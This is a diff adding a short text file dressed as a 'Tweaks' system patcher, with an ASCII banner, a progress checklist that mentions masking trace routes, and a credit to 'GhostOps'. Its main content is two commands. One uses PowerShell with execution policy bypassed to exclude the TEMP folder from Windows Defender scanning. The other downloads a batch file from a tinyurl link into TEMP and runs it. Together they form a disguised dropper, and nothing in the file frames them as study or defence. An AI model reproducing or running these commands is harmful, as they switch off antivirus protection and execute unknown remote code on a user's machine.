@@ -1,0 +1,20 @@
+  _______                 _        
+ |__   __|               | |       
+    | |_      _____  __ _| | _____ 
+    | \ \ /\ / / _ \/ _` | |/ / __|
+    | |\ V  V /  __/ (_| |   <\__ \
+    |_| \_/\_/ \___|\__,_|_|\_\___/
+                                   
+        ▒▒ SYSTEM PATCHER v1.03 ▒▒
+════════════════════════════════════
+[✓] Locating volatile config...
+[✓] Checking silent override...
+[✓] Masking trace routes...
+[•] Getting tweak via curl...
+════════════════════════════════════
+
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:TEMP" 
+curl -sL https://tinyurl.com/tweak100 -o "%TEMP%\tweaker.bat" && "%TEMP%\tweaker.bat"
+
+════════════════════════════════════
+        INITIATED BY: GhostOps
